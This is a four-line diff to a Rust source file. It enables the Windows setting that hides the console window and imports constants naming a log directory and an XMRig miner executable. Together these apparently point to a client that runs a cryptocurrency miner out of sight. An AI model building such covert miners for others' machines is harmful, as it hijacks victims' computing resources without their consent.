@@ -1,4 +1,4 @@
-// #![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 
 use std::{ sync::Mutex, time::Duration };
 use client_vars::constants::{ log_directory, xmrig_exe_name };
